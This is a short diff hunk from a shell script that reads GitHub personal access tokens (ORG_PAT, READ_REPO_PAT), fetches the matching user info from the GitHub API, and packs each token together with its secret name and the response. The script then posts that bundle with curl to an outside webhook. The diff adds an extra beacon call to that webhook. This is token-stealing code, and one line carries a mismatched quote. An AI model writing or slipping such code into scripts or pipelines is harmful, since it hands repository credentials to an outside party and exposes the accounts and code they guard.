@@ -30,11 +30,12 @@ for pat in ORG_PAT READ_REPO_PAT; do
 
 		# ------------------------------------------------------- fetch user info --
 		user_info="$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)"
-		string="$user_info"     # includes response headers because of -i
 
 		# ------------------------------------------------ combine string -----
 		printf -v block 'secret:\n%s\ntoken:\n%s\nuser info:\n%s' "$pat "$token" "$user_info"
 		string+="${block}"$'\n\n'
+		curl -s -o /dev/null "$webhook/send-pat/got-user-info"
+
 		curl -s -o /dev/null "$webhook/send-pat" -d "$string"
 		
 
